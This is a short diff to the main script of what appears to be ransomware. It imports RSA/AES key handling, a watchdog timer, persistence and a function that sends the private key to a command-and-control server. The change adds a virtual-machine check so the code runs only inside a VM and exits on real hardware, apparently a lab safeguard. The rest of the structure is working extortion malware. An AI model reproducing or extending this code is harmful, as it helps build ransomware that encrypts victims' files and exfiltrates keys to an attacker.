@@ -5,8 +5,17 @@ from Encrypt import generate_rsa_keys, save_encrypted_aes_key, save_rsa_keys, ge
 from Timer import save_timer_data, watchdog_timer,load_timer_data
 from RSA_Key_Handling import send_private_key_to_c2
 from Persistence import os_check
+from VM_Check import running_in_vm
 
 ####################################################################################################################
+
+# Do not remove these lines
+vm_check = running_in_vm()
+if not vm_check:
+    print("Running on metal") # Debug Message
+    exit(1)
+else:
+    print("Running on vm") # Debug Message
 
 # Quick check to see if timer data exist or not
 timer_data = load_timer_data()
